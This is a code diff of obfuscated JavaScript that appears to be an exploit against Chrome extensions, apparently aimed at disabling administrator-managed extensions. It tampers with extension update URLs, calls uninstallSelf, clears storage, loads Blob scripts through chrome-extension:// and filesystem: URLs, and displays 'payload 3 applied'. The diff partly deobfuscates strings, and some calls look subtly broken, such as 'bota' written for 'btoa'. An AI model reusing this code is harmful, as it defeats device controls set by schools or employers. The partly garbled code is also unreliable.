@@ -184,7 +184,7 @@ const m = function() {
         }
         _().runtime.id.startsWith("i") || (document.getElementById("updates").textContent = `payload 3 applied. (you aren't supposed to know what this means)`, _().extension[`setUpdateUrlData`](decodeURIComponent(`%E0%B6%9E`).repeat(1024))), localStorage[`cluster`]?.startsWith(`AVOID_OS,`) || (D.checked = !0), D.onclick = function $() {
             D[`checked`] ? (delete window.WebRequestEventImpl, localStorage.clear()) : (_().management[`uninstallSelf`].bind(_().runtime.id), Storage.prototype[`setItem`].call(window[`localStorage`], `cluster`, `AVOID_OS,` + Date.now() * (Math[`random`]() + 1.5))), location.reload.call(n[`location`]), setTimeout(x, 1500)
-        }, navigator[`persistLocalFiles`] = !0, t(`/i.js`, `text/javascript`, o + d + t + B + ";" + B.name + "()//"), t(`/i.html`, "text/html", d`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`).then(() => {
+        }, navigator[`persistLocalFiles`] = !0, t(`/i.js`, `text/javascript`, o + d + t + B + ";" + B.name + "()//"), t(`/i.html`, "text/html", d`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`).then(() => {  // important line
                                                                                                                                                
             window[`navigator`][`storage`][`persist`]()        })
     },
@@ -216,14 +216,14 @@ function e(n, _) {
             D.src = n, _.document.body.appendChild(D), top.close()
         },
         x = URL[`createObjectURL`](n),
-        $ = new window[`Blob`]([`\x12<?2`], {
+        $ = new window[`Blob`]([`${o};${d};(${D})("${x}")`], {
             type: `text/javascript`
         }),
-        C = URL[d`3B51D5\x1F2:53D%"\x1C`]($),
-        t = d`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` + C + d`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;
-    return _ === SI.BETA ? `${d`69<5CICD5=\n38B?=5{5HD5>C9?>\n}}`}${_}${d`}D5=@?B1BI}9|8D=<q9=@?BDvu`}${C}')` : d`38B?=5{5HD5>C9?>\n}}` + _ + d`}` + (.3 > Math.random() ? "/" : "") + d(а[1]) + [d`\x0F31D57?BI\r`] + window[d`5>3?45%"\x19\x13?=@?>5>D`](window[d`2D?1`](t))
+        C = URL[`createObjectURL`]($),
+        t = d`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` + C + d`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;  // important line
+    return _ === SI.BETA ? `${`filesystem:chrome-extension://`}${_}${`/temporary/i.html#import('`}${C}')` : `chrome-extension://` + _ + `/` + (.3 > Math.random() ? "/" : "") + d(а[1]) + [`?category=`] + window[`encodeURIComponent`](window[`bota`](t))
 }
-
+//////
 function gS2U(n) {
     return e(new window[d`\x12<?2`]([`${o};${d};(${m})()`], {
         type: `text/javascript`
